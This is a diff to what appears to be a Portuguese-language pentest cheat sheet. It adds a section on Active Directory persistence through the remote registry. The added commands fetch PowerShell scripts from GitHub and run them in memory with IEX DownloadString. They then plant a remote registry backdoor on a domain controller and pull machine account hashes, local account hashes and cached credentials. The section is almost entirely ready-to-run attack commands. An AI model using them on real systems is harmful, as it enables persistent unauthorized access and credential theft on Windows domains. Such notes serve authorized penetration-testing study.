@@ -1780,8 +1780,32 @@ Set-RemotePSRemoting -Username vegeta -computername tech-dc01 -Remove -Verbose
 Enter-PSSession -computername tech-dc01
 Invoke-Command -Scriptblock{whoami} -computername tech-dc01
 ```
-
-
+### PERSISTENCE REMOTE REGISTRY
+##### PERSISTENCE REMOTE REGISTRY - LOAD REQUIREMENTS
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/Add-RemoteRegBackdoor.ps1 -Outfile Add-RemoteRegBackdoor.ps1
+Import-Module .\Add-RemoteRegBackdoor.ps1
+```
+```
+IEX (New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Add-RemoteRegBackdoor.ps1")
+```
+##### PERSISTENCE REMOTE REGISTRY - ADICIONAR PERMISSÃO PARA REGISTRO REMOTO. (RODANDO NO COMPUTADOR LOCAL)
+```
+Add-RemoteRegBackdoor -Trustee pentester -Verbose
+```
+##### PERSISTENCE REMOTE REGISTRY - ADICIONAR PERMISSÃO PARA REGISTRO REMOTO. (RODANDO REMOTAMENTE)
+```
+Add-RemoteRegBackdoor -Computername tech-dc01 -Trustee pentester -Verbose
+```
+##### PERSISTENCE REMOTE REGISTRY - RECUPERAR INFORMAÇÕES REMOTAMENTE: (NÃO FUNCIONOU)
+```
+Get-RemoteMachineAccountHash Computername tech-dc01 -Verbose
+```
+IEX (New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/RemoteHashRetrieval.ps1")
+Get-RemoteMachineAccountHash -Computername tech-dc01 -Verbose
+Get-RemoteLocalAccountHash -Computername tech-dc01 -Verbose
+Get-RemoteCachedCredential -Computername tech-dc01 -Verbose
+```
 
 
 
